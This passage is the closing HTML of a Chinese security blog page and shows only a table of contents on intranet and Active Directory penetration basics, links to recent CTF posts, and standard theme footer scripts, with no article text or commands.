class="toc-text">用户与权限体系</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6-%E8%B7%AF%E5%BE%84"><span class="toc-number">14.2.2.</span> <span class="toc-text">关键系统文件 &amp; 路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%86%85%E7%BD%AE%E5%91%BD%E4%BB%A4%EF%BC%88%E5%BF%85%E8%AE%B0%EF%BC%89"><span class="toc-number">14.2.3.</span> <span class="toc-text">常用内置命令（必记）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6"><span class="toc-number">14.2.4.</span> <span class="toc-text">Windows 认证机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E3%80%81%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E3%80%81%E6%B3%A8%E5%86%8C%E8%A1%A8"><span class="toc-number">14.2.5.</span> <span class="toc-text">服务、计划任务、注册表</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%EF%BC%88%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%EF%BC%89"><span class="toc-number">14.3.</span> <span class="toc-text">Linux 内网基础（服务器内网主机）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7-%E6%9D%83%E9%99%90"><span class="toc-number">14.3.1.</span> <span class="toc-text">用户 &amp; 权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%EF%BC%88%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%89"><span class="toc-number">14.3.2.</span> <span class="toc-text">基础命令（内网信息收集）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-%E5%86%85%E7%BD%91%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1"><span class="toc-number">14.3.3.</span> <span class="toc-text">Linux 内网常见服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E6%A6%82%E5%BF%B5"><span class="toc-number">14.3.4.</span> <span class="toc-text">关键概念</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Active-Directory-%E5%9F%9F%E5%9F%BA%E7%A1%80%EF%BC%88%E4%BC%81%E4%B8%9A%E5%86%85%E7%BD%91%E6%A0%B8%E5%BF%83%EF%BC%8C%E5%9F%9F%E6%B8%97%E9%80%8F%E5%89%8D%E7%BD%AE%EF%BC%89"><span class="toc-number">14.4.</span> <span class="toc-text">Active Directory 域基础（企业内网核心，域渗透前置）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E9%80%9A%E7%94%A8%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%EF%BC%88%E6%94%BB%E5%87%BB%E9%93%BE%E4%B8%B2%E8%81%94%EF%BC%89"><span class="toc-number">14.5.</span> <span class="toc-text">内网通用基础概念（攻击链串联）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8"><span class="toc-number">14.6.</span> <span class="toc-text">内网安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%EF%BC%9A"><span class="toc-number">14.6.1.</span> <span class="toc-text">基本概念：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E7%BB%84"><span class="toc-number">14.6.2.</span> <span class="toc-text">工作组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E7%9A%84%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5"><span class="toc-number">14.6.3.</span> <span class="toc-text">域的相关概念</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%EF%BC%88DC%EF%BC%8CDomain-Controller%EF%BC%89"><span class="toc-number">14.6.3.1.</span> <span class="toc-text">域控制器（DC，Domain Controller）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%EF%BC%88AD%EF%BC%8CActive-Directory%EF%BC%89"><span class="toc-number">14.6.3.2.</span> <span class="toc-text">活动目录（AD，Active Directory）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS%EF%BC%88%E5%9F%9F%E5%90%8D%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89"><span class="toc-number">14.6.3.3.</span> <span class="toc-text">DNS（域名服务器）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E4%BD%93%E7%B3%BB%E6%89%A9%E5%B1%95%E5%90%8D%E8%AF%8D"><span class="toc-number">14.6.3.4.</span> <span class="toc-text">域体系扩展名词</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E5%9F%9F%E7%9A%84%E5%88%92%E5%88%86"><span class="toc-number">14.6.4.</span> <span class="toc-text">安全域的划分</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%92%E5%88%86%E7%9B%AE%E7%9A%84"><span class="toc-number">14.6.4.1.</span> <span class="toc-text">划分目的</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%8F%E5%85%B8%E4%B8%89%E5%8C%BA%E5%88%92%E5%88%86%EF%BC%88%E9%98%B2%E7%81%AB%E5%A2%99%E9%9A%94%E7%A6%BB%EF%BC%89"><span class="toc-number">14.6.4.2.</span> <span class="toc-text">经典三区划分（防火墙隔离）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E7%BB%84-vs-%E5%9F%9F"><span class="toc-number">14.6.5.</span> <span class="toc-text">工作组 vs 域</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/web859/" title="CTFShow入门内网渗透">CTFShow入门内网渗透</a><time datetime="2026-11-22T05:58:14.580Z" title="发表于 2026-11-22 13:58:14">2026-11-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/sqlmap/" title="SQLMap使用总结及CTFshow靶场所有题目详细分析">SQLMap使用总结及CTFshow靶场所有题目详细分析</a><time datetime="2026-11-18T04:48:27.672Z" title="发表于 2026-11-18 12:48:27">2026-11-18</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2024 - 2026 By Teaaa</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.7.1.260810</a></span></div><div class="footer_custom_text">navy~</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.7.1.260810"></script><script src="/js/main.js?v=5.7.1.260810"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="220,100,40" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.7.1.260810"></script></div></div></body></html>
